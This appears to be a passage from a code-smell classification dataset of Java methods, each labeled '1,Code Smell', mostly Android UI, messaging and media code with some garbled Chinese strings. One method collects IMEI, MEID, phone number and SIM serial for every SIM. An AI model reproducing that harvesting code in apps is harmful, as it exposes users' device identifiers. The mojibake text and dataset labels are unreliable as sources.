          }
        }
        File snapFile=new File(targetPath + File.separator + fileName);
        FileOutputStream outStream=new FileOutputStream(snapFile);
        outStream.write(Objects.requireNonNull(response.body()).bytes());
        outStream.flush();
        outStream.close();
      }
 else {
        logger.error(String.format(""[ %s ]璇锋眰澶辫触: %s %s"",url,response.code(),response.message()));
      }
    }
 else {
      logger.error(String.format(""[ %s ]璇锋眰澶辫触: %s %s"",url,response.code(),response.message()));
    }
    Objects.requireNonNull(response.body()).close();
  }
 catch (  ConnectException e) {
    logger.error(String.format(""杩炴帴ZLM澶辫触: %s, %s"",e.getCause().getMessage(),e.getMessage()));
    logger.info(""璇锋鏌edia閰嶇疆骞剁‘璁LM宸插惎鍔..."");
  }
catch (  IOException e) {
    logger.error(String.format(""[ %s ]璇锋眰澶辫触: %s"",url,e.getMessage()));
  }
}
",1,Code Smell
"public void showTopView(boolean animated,final boolean openKeyboard){
  showTopView(animated,openKeyboard,false);
}
private void showTopView(boolean animated,final boolean openKeyboard,boolean skipAwait){
  if (topView == null || topViewShowed || getVisibility() != VISIBLE) {
    if ((recordedAudioPanel == null || recordedAudioPanel.getVisibility() != VISIBLE) && (!forceShowSendButton || openKeyboard)) {
      openKeyboard();
    }
    return;
  }
  boolean openKeyboardInternal=(recordedAudioPanel == null || recordedAudioPanel.getVisibility() != VISIBLE) && (!forceShowSendButton || openKeyboard) && (botReplyMarkup == null || editingMessageObject != null);
  if (!skipAwait && animated && openKeyboardInternal&& !(keyboardVisible || isPopupShowing())) {
    openKeyboard();
    if (showTopViewRunnable != null) {
      AndroidUtilities.cancelRunOnUIThread(showTopViewRunnable);
    }
    AndroidUtilities.runOnUIThread(showTopViewRunnable=() -> {
      showTopView(true,false,true);
      showTopViewRunnable=null;
    }
,200);
    return;
  }
  needShowTopView=true;
  topViewShowed=true;
  if (allowShowTopView) {
    topView.setVisibility(VISIBLE);
    topLineView.setVisibility(VISIBLE);
    if (currentTopViewAnimation != null) {
      currentTopViewAnimation.cancel();
      currentTopViewAnimation=null;
    }
    resizeForTopView(true);
    if (animated) {
      currentTopViewAnimation=ValueAnimator.ofFloat(topViewEnterProgress,1f);
      currentTopViewAnimation.addUpdateListener(topViewUpdateListener);
      currentTopViewAnimation.addListener(new AnimatorListenerAdapter(){
        @Override public void onAnimationEnd(        Animator animation){
          if (currentTopViewAnimation != null && currentTopViewAnimation.equals(animation)) {
            currentTopViewAnimation=null;
          }
          NotificationCenter.getInstance(currentAccount).onAnimationFinish(notificationsIndex);
          if (parentFragment != null && parentFragment.mentionContainer != null) {
            parentFragment.mentionContainer.setTranslationY(0);
          }
        }
      }
);
      currentTopViewAnimation.setDuration(ChatListItemAnimator.DEFAULT_DURATION + 20);
      currentTopViewAnimation.setInterpolator(ChatListItemAnimator.DEFAULT_INTERPOLATOR);
      currentTopViewAnimation.start();
      notificationsIndex=NotificationCenter.getInstance(currentAccount).setAnimationInProgress(notificationsIndex,null);
    }
 else {
      topViewEnterProgress=1f;
      topView.setTranslationY(0);
      topLineView.setAlpha(1.0f);
    }
    if (openKeyboardInternal) {
      if (messageEditText != null) {
        messageEditText.requestFocus();
      }
      openKeyboard();
    }
  }
}",1,Code Smell
"/** 
 * 鑾峰彇鎸囧畾share_token 杩斿洖share_token鎴朜ot_Login
 */
@GetMapping(""/token/shared_token"") public Result getSimplySharedToken(@RequestParam(""password"") String password,@RequestParam(""tokenName"") String tokenName){
  systemSetting systemSetting=systemService.selectSetting();
  if (!systemSetting.getIsGetToken()) {
    return Result.error(""Not_Open"");
  }
  if (password.equals(systemSetting.getGetTokenPassword())) {
    for (    token token : apiService.selectToken("""")) {
      if (token.getName().equals(tokenName)) {
        if (token.getShare_token() != null) {
          return Result.success(token.getShare_token());
        }
        return Result.error(""璇okenName娌℃湁瀛樻斁Shared_Token"");
      }
    }
    return Result.error(""鏈壘鍒拌tokenName锛�"");
  }
 else {
    return Result.error(""Not_Login"");
  }
}
",1,Code Smell
"public void set(final BaseFragment fragment,int currentAccount){
  final ArrayList<UnconfirmedAuthController.UnconfirmedAuth> auths=MessagesController.getInstance(currentAccount).getUnconfirmedAuthController().auths;
  titleTextView.setText(LocaleController.getString(R.string.UnconfirmedAuthTitle));
  yesButton.setText(LocaleController.getString(R.string.UnconfirmedAuthConfirm));
  yesButton.setLoading(false,false);
  noButton.setText(LocaleController.getString(R.string.UnconfirmedAuthDeny));
  noButton.setLoading(false,false);
  if (auths != null && auths.size() == 1) {
    String from="""";
    from+=auths.get(0).device;
    if (!TextUtils.isEmpty(auths.get(0).location) && !from.isEmpty()) {
      from+="", "";
    }
    from+=auths.get(0).location;
    messageTextView.setText(LocaleController.formatString(R.string.UnconfirmedAuthSingle,from));
  }
 else   if (auths != null && auths.size() > 1) {
    String from=auths.get(0).location;
    for (int i=1; i < auths.size(); ++i) {
      if (!TextUtils.equals(from,auths.get(i).location)) {
        from=null;
        break;
      }
    }
    if (from == null) {
      messageTextView.setText(LocaleController.formatPluralString(""UnconfirmedAuthMultiple"",auths.size()));
    }
 else {
      messageTextView.setText(LocaleController.formatPluralString(""UnconfirmedAuthMultipleFrom"",auths.size(),from));
    }
  }
  yesButton.setOnClickListener(v -> {
    SpannableStringBuilder message=AndroidUtilities.replaceSingleTag(LocaleController.getString(R.string.UnconfirmedAuthConfirmedMessage),Theme.key_undo_cancelColor,REPLACING_TAG_TYPE_LINK,() -> {
      Bulletin.hideVisible();
      fragment.presentFragment(new SessionsActivity(0));
    }
);
    SpannableString arrowStr=new SpannableString("">"");
    ColoredImageSpan span=new ColoredImageSpan(R.drawable.attach_arrow_right);
    span.setOverrideColor(Theme.getColor(Theme.key_undo_cancelColor));
    span.setScale(.7f,.7f);
    span.setWidth(dp(12));
    arrowStr.setSpan(span,0,arrowStr.length(),Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
    AndroidUtilities.replaceCharSequence("">"",message,arrowStr);
    BulletinFactory.of(fragment).createSimpleBulletin(R.raw.contact_check,LocaleController.getString(R.string.UnconfirmedAuthConfirmed),message).show();
    MessagesController.getInstance(currentAccount).getUnconfirmedAuthController().confirm(auths,success -> {
    }
);
    MessagesController.getInstance(currentAccount).getUnconfirmedAuthController().cleanup();
  }
);
  noButton.setOnClickListener(v -> {
    noButton.setLoading(true);
    MessagesController.getInstance(currentAccount).getUnconfirmedAuthController().deny(auths,success -> {
      if (LaunchActivity.isActive)       showLoginPreventedSheet(success);
      noButton.setLoading(false);
      MessagesController.getInstance(currentAccount).getUnconfirmedAuthController().cleanup();
    }
);
  }
);
}",1,Code Smell
"protected void searchXml(final Element node,String keyword){
  String[] fs=keyword.split(""\\."");
  String current_keyword=fs[0];
  String attr_name=null;
  String new_keyword=null;
  if (current_keyword.contains(""#"")) {
    attr_name=current_keyword.split(""#"")[1];
    current_keyword=current_keyword.split(""#"")[0];
  }
  if (fs.length != 1) {
    new_keyword=keyword.replace(current_keyword + ""."","""");
  }
 else {
    new_keyword=current_keyword;
  }
  if (node.getName().equals(current_keyword)) {
    if (attr_name != null) {
      final List<Attribute> listAttr=node.attributes();
      for (      final Attribute attr : listAttr) {
        if (attr.getName().equals(attr_name)) {
          result.add(attr.getValue());
        }
      }
      return;
    }
    if (fs.length == 1) {
      result.add(node.getTextTrim());
    }
 else {
      final List<Element> listElement=node.elements();
      for (      final Element e : listElement) {
        searchXml(e,new_keyword);
      }
    }
  }
 else {
    final List<Element> listElement=node.elements();
    for (    final Element e : listElement) {
      searchXml(e,keyword);
    }
  }
}",1,Code Smell
"/** 
 * 閫掑綊鏋勯�犳楠ゆ爲
 * @param steps           褰撳墠鍦烘櫙涓嬶紝褰撳墠灞傜骇鐨勬楠�
 * @param parentStepMap   褰撳墠鍦烘櫙鎵�鏈夌殑姝ラ锛宬ey 涓虹埗姝ラID锛寁alue 涓哄瓙姝ラ鍒楄〃
 * @param scenarioStepMap 鎵�鏈夊満鏅楠わ紝key 涓哄満鏅疘D锛寁alue 涓哄瓙姝ラ鍒楄〃
 */
private List<ApiScenarioStepDTO> buildStepTree(List<ApiScenarioStepDTO> steps,Map<String,List<ApiScenarioStepDTO>> parentStepMap,Map<String,List<ApiScenarioStepDTO>> scenarioStepMap,Set<String> stepIdSet){
  if (CollectionUtils.isEmpty(steps)) {
    return Collections.emptyList();
  }
  for (int i=0; i < steps.size(); i++) {
    ApiScenarioStepDTO step=steps.get(i);
    if (stepIdSet.contains(step.getId())) {
      step=BeanUtils.copyBean(new ApiScenarioStepDTO(),step);
      steps.set(i,step);
    }
    stepIdSet.add(step.getId());
    List<ApiScenarioStepDTO> children=Optional.ofNullable(parentStepMap.get(step.getId())).orElse(new ArrayList<>(0));
    if (isRefOrPartialScenario(step)) {
      List<ApiScenarioStepDTO> scenarioSteps=scenarioStepMap.get(step.getResourceId());
      if (CollectionUtils.isEmpty(scenarioSteps)) {
        continue;
      }
      scenarioSteps.forEach(item -> {
        if (StringUtils.isEmpty(item.getParentId())) {
          children.add(item);
        }
      }
);
      if (CollectionUtils.isEmpty(children)) {
        continue;
      }
      Map<String,List<ApiScenarioStepDTO>> childStepMap=scenarioSteps.stream().collect(Collectors.groupingBy(item -> Optional.ofNullable(item.getParentId()).orElse(StringUtils.EMPTY)));
      step.setChildren(buildStepTree(children,childStepMap,scenarioStepMap,stepIdSet));
    }
 else {
      if (CollectionUtils.isEmpty(children)) {
        continue;
      }
      step.setChildren(buildStepTree(children,parentStepMap,scenarioStepMap,stepIdSet));
    }
  }
  return steps.stream().sorted(Comparator.comparing(ApiScenarioStepDTO::getSort)).collect(Collectors.toList());
}",1,Code Smell
"@Override public MySQLConstant getExpectedValue(){
  MySQLConstant leftVal=expr.getExpectedValue();
  if (leftVal.isNull()) {
    return MySQLConstant.createNullConstant();
  }
  if (leftVal.isInt() && !leftVal.isSigned()) {
    throw new IgnoreMeException();
  }
  boolean isNull=false;
  for (  MySQLExpression rightExpr : listElements) {
    MySQLConstant rightVal=rightExpr.getExpectedValue();
    if (rightVal.isInt() && !rightVal.isSigned()) {
      throw new IgnoreMeException();
    }
    MySQLConstant convertedRightVal=rightVal;
    MySQLConstant isEquals=leftVal.isEquals(convertedRightVal);
    if (isEquals.isNull()) {
      isNull=true;
    }
 else {
      if (isEquals.getInt() == 1) {
        return MySQLConstant.createBoolean(isTrue);
      }
    }
  }
  if (isNull) {
    return MySQLConstant.createNullConstant();
  }
 else {
    return MySQLConstant.createBoolean(!isTrue);
  }
}",1,Code Smell
"@Override public void onGifSelected(View view,Object gif,String query,Object parent,boolean notify,int scheduleDate){
  if (isInScheduleMode() && scheduleDate == 0) {
    AlertsCreator.createScheduleDatePickerDialog(parentActivity,parentFragment.getDialogId(),(n,s) -> onGifSelected(view,gif,query,parent,n,s),resourcesProvider);
  }
 else {
    if (slowModeTimer > 0 && !isInScheduleMode()) {
      if (delegate != null) {
        delegate.onUpdateSlowModeButton(view != null ? view : slowModeButton,true,slowModeButton.getText());
      }
      return;
    }
    if (delegate != null) {
      delegate.beforeMessageSend(null,notify,scheduleDate);
    }
    if (stickersExpanded) {
      if (searchingType != 0) {
        emojiView.hideSearchKeyboard();
      }
      setStickersExpanded(false,true,false);
    }
    if (gif instanceof TLRPC.Document) {
      TLRPC.Document document=(TLRPC.Document)gif;
      SendMessagesHelper.getInstance(currentAccount).sendSticker(document,query,dialog_id,replyingMessageObject,getThreadMessage(),parent,null,notify,scheduleDate,false);
      MediaDataController.getInstance(currentAccount).addRecentGif(document,(int)(System.currentTimeMillis() / 1000),true);
      if (DialogObject.isEncryptedDialog(dialog_id)) {
        accountInstance.getMessagesController().saveGif(parent,document);
      }
    }
 else     if (gif instanceof TLRPC.BotInlineResult) {
      TLRPC.BotInlineResult result=(TLRPC.BotInlineResult)gif;
      if (result.document != null) {
        MediaDataController.getInstance(currentAccount).addRecentGif(result.document,(int)(System.currentTimeMillis() / 1000),false);
        if (DialogObject.isEncryptedDialog(dialog_id)) {
          accountInstance.getMessagesController().saveGif(parent,result.document);
        }
      }
      TLRPC.User bot=(TLRPC.User)parent;
      HashMap<String,String> params=new HashMap<>();
      params.put(""id"",result.id);
      params.put(""query_id"","""" + result.query_id);
      params.put(""force_gif"",""1"");
      SendMessagesHelper.prepareSendingBotContextResult(parentFragment,accountInstance,result,params,dialog_id,replyingMessageObject,getThreadMessage(),notify,scheduleDate);
      if (searchingType != 0) {
        setSearchingTypeInternal(0,true);
        emojiView.closeSearch(true);
        emojiView.hideSearchKeyboard();
      }
    }
    if (delegate != null) {
      delegate.onMessageSend(null,notify,scheduleDate);
    }
  }
}",1,Code Smell
"public String getPhoneNumber(Context context){
  TelephonyManager phoneMgr=(TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
  String out="""";
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
    if (SubscriptionManager.from(activity).getActiveSubscriptionInfoCount() > 0) {
      String lst="""";
      String header="""";
      for (int i=0; i < SubscriptionManager.from(activity).getActiveSubscriptionInfoList().size(); i++) {
        if (i == 0) {
          header=""First Sim: "";
        }
 else         if (i == 1) {
          header=""Second Sim: "";
        }
 else         if (i == 2) {
          header=""Third Sim: "";
        }
        lst+=header + ""--------------------------"";
        lst+=""\nCALL STATE : "" + phoneMgr.createForSubscriptionId(i).getCallState();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
          lst+=""\nIMEI NUMBER : "" + phoneMgr.createForSubscriptionId(i).getImei();
          lst+=""\nMEI NUMBER : "" + phoneMgr.createForSubscriptionId(i).getMeid();
        }
        lst+=""\nMOBILE NUMBER : "".concat(phoneMgr.createForSubscriptionId(i).getLine1Number());
        lst+=""\nSERIAL NUMBER : "".concat(phoneMgr.createForSubscriptionId(i).getSimSerialNumber());
        lst+=""\nSIM OPERATOR NAME : "" + phoneMgr.createForSubscriptionId(i).getSimOperatorName();
        lst+=""\nSIM STATE : "".concat(String.valueOf(phoneMgr.createForSubscriptionId(i).getSimState()));
        lst+=""\nCOUNTRY ISO : "" + phoneMgr.createForSubscriptionId(i).getSimCountryIso() + ""\n"";
        lst+=""\n"";
      }
      out=lst;
    }
  }
 else {
    String lst="""";
    lst+=""CALL STATE : "" + phoneMgr.getCallState() + ""\n"";
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
      lst+=""IMEI NUMBER :-"" + phoneMgr.getImei();
      lst+=""MEI NUMBER :-"" + phoneMgr.getMeid();
    }
    lst+=""MOBILE NUMBER :-"" + phoneMgr.getLine1Number() + ""\n"";
    lst+=""SERIAL NUMBER :-"" + phoneMgr.getSimSerialNumber() + ""\n"";
    lst+=""SIM OPERATOR NAME :-"" + phoneMgr.getSimOperatorName() + ""\n"";
    lst+=""SIM STATE :-"" + phoneMgr.getSimState() + ""\n"";
    lst+=""COUNTRY ISO :-"" + phoneMgr.getSimCountryIso() + ""\n"";
    out=lst;
  }
  return out;
}",1,Code Smell
"private static void ecoLifeTick(){
  try {
    JSONObject jo=new JSONObject(EcoLifeRpcCall.queryHomePage());
    if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
      JSONObject data=jo.getJSONObject(""data"");
      if (!data.has(""dayPoint"")) {
        Log.recordLog(""dayPoint涓轰笉瀛樺湪"",jo.toString());
        return;
      }
      String dayPoint=data.getString(""dayPoint"");
      JSONArray actionListVO=data.getJSONArray(""actionListVO"");
      for (int i=0; i < actionListVO.length(); i++) {
        JSONObject actionVO=actionListVO.getJSONObject(i);
        JSONArray actionItemList=actionVO.getJSONArray(""actionItemList"");
        for (int j=0; j < actionItemList.length(); j++) {
          JSONObject actionItem=actionItemList.getJSONObject(j);
          if (!actionItem.has(""actionId""))           continue;
          if (actionItem.getBoolean(""actionStatus""))           continue;
          String actionId=actionItem.getString(""actionId"");
          String actionName=actionItem.getString(""actionName"");
          boolean isGuangpan=false;
          if (""photoguangpan"".equals(actionId))           continue;
          jo=new JSONObject(EcoLifeRpcCall.tick(actionId,""ALIPAY"",dayPoint,isGuangpan));
          if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
            Log.forest(""缁胯壊鎵撳崱馃崁["" + actionName + ""]"");
          }
 else {
            Log.recordLog(jo.getString(""resultDesc""),jo.toString());
          }
          Thread.sleep(150);
        }
      }
    }
  }
 catch (  Throwable th) {
    Log.i(TAG,""ecoLifeTick err:"");
    Log.printStackTrace(TAG,th);
  }
}",1,Code Smell
"@Subscribe(threadMode=ThreadMode.MAIN) public void onPlayerEvent(PlayerEvent event){
  if (isBackground())   return;
switch (event.getState()) {
case 0:
    setInitTrack(true);
  setTrackVisible(false);
mClock.setCallback(this);
break;
case Player.STATE_IDLE:
break;
case Player.STATE_BUFFERING:
showProgress();
break;
case Player.STATE_READY:
stopSearch();
setMetadata();
resetToggle();
hideProgress();
mPlayers.reset();
setDefaultTrack();
setTrackVisible(true);
mHistory.setPlayer(mPlayers.getPlayer());
mBinding.widget.size.setText(mPlayers.getSizeText());
break;
case Player.STATE_ENDED:
checkEnded();
break;
}
}
@Subscribe(threadMode=ThreadMode.MAIN) public void onPlayerEvent(PlayerEvent event){
  if (isRedirect())   return;
switch (event.getState()) {
case 0:
    setInitTrack(true);
  setTrackVisible(false);
mClock.setCallback(this);
break;
case Player.STATE_IDLE:
break;
case Player.STATE_BUFFERING:
showProgress();
break;
case Player.STATE_READY:
stopSearch();
checkRotate();
setMetadata();
resetToggle();
hideProgress();
mPlayers.reset();
setDefaultTrack();
setTrackVisible(true);
checkPlayImg(mPlayers.isPlaying());
mHistory.setPlayer(mPlayers.getPlayer());
mBinding.control.size.setText(mPlayers.getSizeText());
if (isVisible(mBinding.control.getRoot())) showControl();
break;
case Player.STATE_ENDED:
checkEnded();
break;
}
}",1,Code Smell
"@Override public void render(long positionUs,long elapsedRealtimeUs) throws ExoPlaybackException {
  if (!inputStreamEnded && pendingMetadataCount < MAX_PENDING_METADATA_COUNT) {
    buffer.clear();
    int result=readSource(formatHolder,buffer,false);
    if (result == C.RESULT_BUFFER_READ) {
      if (buffer.isEndOfStream()) {
        inputStreamEnded=true;
      }
 else       if (buffer.isDecodeOnly()) {
      }
 else {
        buffer.subsampleOffsetUs=subsampleOffsetUs;
        buffer.flip();
        Metadata metadata=decoder.decode(buffer);
        if (metadata != null) {
          List<Metadata.Entry> entries=new ArrayList<>(metadata.length());
          decodeWrappedMetadata(metadata,entries);
          if (!entries.isEmpty()) {
            Metadata expandedMetadata=new Metadata(entries);
            int index=(pendingMetadataIndex + pendingMetadataCount) % MAX_PENDING_METADATA_COUNT;
            pendingMetadata[index]=expandedMetadata;
            pendingMetadataTimestamps[index]=buffer.timeUs;
            pendingMetadataCount++;
          }
        }
      }
    }
 else     if (result == C.RESULT_FORMAT_READ) {
      subsampleOffsetUs=formatHolder.format.subsampleOffsetUs;
    }
  }
  if (pendingMetadataCount > 0 && pendingMetadataTimestamps[pendingMetadataIndex] <= positionUs) {
    invokeRenderer(pendingMetadata[pendingMetadataIndex]);
    pendingMetadata[pendingMetadataIndex]=null;
    pendingMetadataIndex=(pendingMetadataIndex + 1) % MAX_PENDING_METADATA_COUNT;
    pendingMetadataCount--;
  }
}",1,Code Smell
"private void updateCascadeEnter(float progress,boolean enter){
  int parentTop=(int)(selectAnimatedEmojiDialog.getY() + selectAnimatedEmojiDialog.contentView.getY() + selectAnimatedEmojiDialog.emojiGridView.getY());
  ArrayList<View> animatedViews=null;
  boolean updated=false;
  for (int i=0; i < selectAnimatedEmojiDialog.emojiGridView.getChildCount(); i++) {
    View child=selectAnimatedEmojiDialog.emojiGridView.getChildAt(i);
    if (animatingEnterChild.contains(child)) {
      continue;
    }
    float cy=parentTop + child.getTop() + child.getMeasuredHeight() / 2f;
    if (cy < drawingRect.bottom && cy > drawingRect.top && progress != 0) {
      if (animatedViews == null) {
        animatedViews=new ArrayList<>();
      }
      animatedViews.add(child);
      animatingEnterChild.add(child);
    }
 else {
      setScaleForChild(child,0f);
      updated=true;
    }
  }
  parentTop=(int)(selectAnimatedEmojiDialog.getY() + selectAnimatedEmojiDialog.contentView.getY() + selectAnimatedEmojiDialog.emojiTabs.getY());
  for (int i=0; i < selectAnimatedEmojiDialog.emojiTabs.contentView.getChildCount(); i++) {
    View child=selectAnimatedEmojiDialog.emojiTabs.contentView.getChildAt(i);
    if (animatingEnterChild.contains(child)) {
      continue;
    }
    float cy=parentTop + child.getTop() + child.getMeasuredHeight() / 2f;
    if (cy < drawingRect.bottom && cy > drawingRect.top && progress != 0) {
      if (animatedViews == null) {
        animatedViews=new ArrayList<>();
      }
      animatedViews.add(child);
      animatingEnterChild.add(child);
    }
 else {
      setScaleForChild(child,0f);
      updated=true;
    }
  }
  if (updated) {
    selectAnimatedEmojiDialog.emojiGridViewContainer.invalidate();
  }
  if (animatedViews != null) {
    ValueAnimator valueAnimator=ValueAnimator.ofFloat(0,1f);
    ArrayList<View> finalAnimatedViews=animatedViews;
    valueAnimator.addUpdateListener(animation -> {
      float s=(float)animation.getAnimatedValue();
      for (int i=0; i < finalAnimatedViews.size(); i++) {
        View v=finalAnimatedViews.get(i);
        setScaleForChild(v,s);
      }
      selectAnimatedEmojiDialog.emojiGridViewContainer.invalidate();
    }
);
    animators.add(valueAnimator);
    valueAnimator.addListener(new AnimatorListenerAdapter(){
      @Override public void onAnimationEnd(      Animator animation){
        super.onAnimationEnd(animation);
        animators.remove(valueAnimator);
        checkAnimationEnd(enter);
      }
    }
);
    if (type == TYPE_STICKER_SET_EMOJI) {
      valueAnimator.setDuration(420);
      valueAnimator.setInterpolator(CubicBezierInterpolator.EASE_OUT_QUINT);
    }
 else {
      valueAnimator.setDuration(350);
      valueAnimator.setInterpolator(new OvershootInterpolator(1f));
    }
    valueAnimator.start();
  }
}",1,Code Smell
"@java.lang.Override public int getSerializedSize(){
  int size=memoizedSize;
  if (size != -1)   return size;
  size=0;
  if (output_ != null) {
    size+=com.google.protobuf.CodedOutputStream.computeMessageSize(1,getOutput());
  }
  if (outputIdx_ != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeInt32Size(2,outputIdx_);
  }
{
    int dataSize=0;
    for (int i=0; i < featureName_.size(); i++) {
      dataSize+=computeStringSizeNoTag(featureName_.getRaw(i));
    }
    size+=dataSize;
    size+=1 * getFeatureNameList().size();
  }
{
    int dataSize=0;
    for (int i=0; i < featureIdx_.size(); i++) {
      dataSize+=com.google.protobuf.CodedOutputStream.computeInt32SizeNoTag(featureIdx_.getInt(i));
    }
    size+=dataSize;
    if (!getFeatureIdxList().isEmpty()) {
      size+=1;
      size+=com.google.protobuf.CodedOutputStream.computeInt32SizeNoTag(dataSize);
    }
    featureIdxMemoizedSerializedSize=dataSize;
  }
{
    int dataSize=0;
    dataSize=8 * getFeatureValueList().size();
    size+=dataSize;
    if (!getFeatureValueList().isEmpty()) {
      size+=1;
      size+=com.google.protobuf.CodedOutputStream.computeInt32SizeNoTag(dataSize);
    }
    featureValueMemoizedSerializedSize=dataSize;
  }
  for (  java.util.Map.Entry<java.lang.String,java.lang.String> entry : internalGetMetadata().getMap().entrySet()) {
    com.google.protobuf.MapEntry<java.lang.String,java.lang.String> metadata__=MetadataDefaultEntryHolder.defaultEntry.newBuilderForType().setKey(entry.getKey()).setValue(entry.getValue()).build();
    size+=com.google.protobuf.CodedOutputStream.computeMessageSize(6,metadata__);
  }
  if (java.lang.Float.floatToRawIntBits(weight_) != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeFloatSize(7,weight_);
  }
  if (featureDomain_ != null) {
    size+=com.google.protobuf.CodedOutputStream.computeMessageSize(8,getFeatureDomain());
  }
  if (outputDomain_ != null) {
    size+=com.google.protobuf.CodedOutputStream.computeMessageSize(9,getOutputDomain());
  }
  size+=unknownFields.getSerializedSize();
  memoizedSize=size;
  return size;
}",1,Code Smell
"public synchronized void newConnections(ConnectionDescriptor[] conns){
  if (conns.length > mSize) {
    mUntrackedItems+=conns.length - mSize;
    conns=Arrays.copyOfRange(conns,conns.length - mSize,conns.length);
  }
  int out_items=conns.length - Math.min((mSize - mCurItems),conns.length);
  int insert_pos=mCurItems;
  ConnectionDescriptor[] removedItems=null;
  if (out_items > 0) {
    int pos=firstPos();
    removedItems=new ConnectionDescriptor[out_items];
    for (int i=0; i < out_items; i++) {
      ConnectionDescriptor conn=mItemsRing[pos];
      if (conn != null) {
        if (conn.ifidx > 0) {
          int num_conn=mConnsByIface.get(conn.ifidx);
          if (--num_conn <= 0)           mConnsByIface.delete(conn.ifidx);
 else           mConnsByIface.put(conn.ifidx,num_conn);
        }
        if (conn.isBlacklisted())         mNumMalicious--;
      }
      removedItems[i]=conn;
      pos=(pos + 1) % mSize;
    }
  }
  for (  ConnectionDescriptor conn : conns) {
    mItemsRing[mTail]=conn;
    mTail=(mTail + 1) % mSize;
    mCurItems=Math.min(mCurItems + 1,mSize);
    int uid=conn.uid;
    AppStats stats=getAppsStatsOrCreate(uid);
    if (conn.ifidx > 0) {
      int num_conn=mConnsByIface.get(conn.ifidx);
      mConnsByIface.put(conn.ifidx,num_conn + 1);
    }
    InetAddress dstAddr=conn.getDstAddr();
    conn.country=mGeo.getCountryCode(dstAddr);
    conn.asn=mGeo.getASN(dstAddr);
    AppDescriptor app=mAppsResolver.getAppByUid(conn.uid,0);
    if (app != null)     conn.encrypted_payload=Utils.hasEncryptedPayload(app,conn);
    processConnectionStatus(conn,stats);
    stats.numConnections++;
    stats.rcvdBytes+=conn.rcvd_bytes;
    stats.sentBytes+=conn.sent_bytes;
  }
  mUntrackedItems+=out_items;
  for (  ConnectionsListener listener : mListeners) {
    if (out_items > 0)     listener.connectionsRemoved(0,removedItems);
    if (conns.length > 0)     listener.connectionsAdded(insert_pos - out_items,conns);
  }
}",1,Code Smell
"/** 
 * This picks a dominant color, looking for high-saturation, high-value, repeated hues.
 * @param bitmap The bitmap to scan
 */
public int findDominantColorByHue(@NonNull final Bitmap bitmap){
  return findDominantColorByHue(bitmap,NUM_SAMPLES);
}
/** 
 * This picks a dominant color, looking for high-saturation, high-value, repeated hues.
 * @param bitmap The bitmap to scan
 */
protected int findDominantColorByHue(@NonNull final Bitmap bitmap,final int samples){
  final int height=bitmap.getHeight();
  final int width=bitmap.getWidth();
  int sampleStride=(int)Math.sqrt((height * width) / samples);
  if (sampleStride < 1) {
    sampleStride=1;
  }
  float[] hsv=mTmpHsv;
  Arrays.fill(hsv,0);
  float[] hueScoreHistogram=mTmpHueScoreHistogram;
  Arrays.fill(hueScoreHistogram,0);
  float highScore=-1;
  int bestHue=-1;
  int[] pixels=mTmpPixels;
  Arrays.fill(pixels,0);
  int pixelCount=0;
  for (int y=0; y < height; y+=sampleStride) {
    for (int x=0; x < width; x+=sampleStride) {
      int argb=bitmap.getPixel(x,y);
      int alpha=0xFF & (argb >> 24);
      if (alpha < 0x80) {
        continue;
      }
      int rgb=argb | 0xFF000000;
      Color.colorToHSV(rgb,hsv);
      int hue=(int)hsv[0];
      if (hue < 0 || hue >= hueScoreHistogram.length) {
        continue;
      }
      if (pixelCount < samples) {
        pixels[pixelCount++]=rgb;
      }
      float score=hsv[1] * hsv[2];
      hueScoreHistogram[hue]+=score;
      if (hueScoreHistogram[hue] > highScore) {
        highScore=hueScoreHistogram[hue];
        bestHue=hue;
      }
    }
  }
  SparseArray<Float> rgbScores=mTmpRgbScores;
  rgbScores.clear();
  int bestColor=0xff000000;
  highScore=-1;
  for (int i=0; i < pixelCount; i++) {
    int rgb=pixels[i];
    Color.colorToHSV(rgb,hsv);
    int hue=(int)hsv[0];
    if (hue == bestHue) {
      float s=hsv[1];
      float v=hsv[2];
      int bucket=(int)(s * 100) + (int)(v * 10000);
      float score=s * v;
      Float oldTotal=rgbScores.get(bucket);
      float newTotal=oldTotal == null ? score : oldTotal + score;
      rgbScores.put(bucket,newTotal);
      if (newTotal > highScore) {
        highScore=newTotal;
        bestColor=rgb;
      }
    }
  }
  return bestColor;
}",1,Code Smell
"@Override public void didReceivedNotification(int id,int account,Object... args){
  if (id == NotificationCenter.proxyChangedByRotation) {
    listView.forAllChild(view -> {
      RecyclerView.ViewHolder holder=listView.getChildViewHolder(view);
      if (holder.itemView instanceof TextDetailProxyCell) {
        TextDetailProxyCell cell=(TextDetailProxyCell)holder.itemView;
        cell.setChecked(cell.currentInfo == SharedConfig.currentProxy);
        cell.updateStatus();
      }
    }
);
    updateRows(false);
  }
 else   if (id == NotificationCenter.proxySettingsChanged) {
    updateRows(true);
  }
 else   if (id == NotificationCenter.didUpdateConnectionState) {
    int state=ConnectionsManager.getInstance(account).getConnectionState();
    if (currentConnectionState != state) {
      currentConnectionState=state;
      if (listView != null && SharedConfig.currentProxy != null) {
        int idx=proxyList.indexOf(SharedConfig.currentProxy);
        if (idx >= 0) {
          RecyclerListView.Holder holder=(RecyclerListView.Holder)listView.findViewHolderForAdapterPosition(idx + proxyStartRow);
          if (holder != null) {
            TextDetailProxyCell cell=(TextDetailProxyCell)holder.itemView;
            cell.updateStatus();
          }
        }
        if (currentConnectionState == ConnectionsManager.ConnectionStateConnected) {
          updateRows(true);
        }
      }
    }
  }
 else   if (id == NotificationCenter.proxyCheckDone) {
    if (listView != null) {
      SharedConfig.ProxyInfo proxyInfo=(SharedConfig.ProxyInfo)args[0];
      int idx=proxyList.indexOf(proxyInfo);
      if (idx >= 0) {
        RecyclerListView.Holder holder=(RecyclerListView.Holder)listView.findViewHolderForAdapterPosition(idx + proxyStartRow);
        if (holder != null) {
          TextDetailProxyCell cell=(TextDetailProxyCell)holder.itemView;
          cell.updateStatus();
        }
      }
      boolean checking=false;
      if (!wasCheckedAllList) {
        for (        SharedConfig.ProxyInfo info : proxyList) {
          if (info.checking || info.availableCheckTime == 0) {
            checking=true;
            break;
          }
        }
        if (!checking) {
          wasCheckedAllList=true;
        }
      }
      if (!checking) {
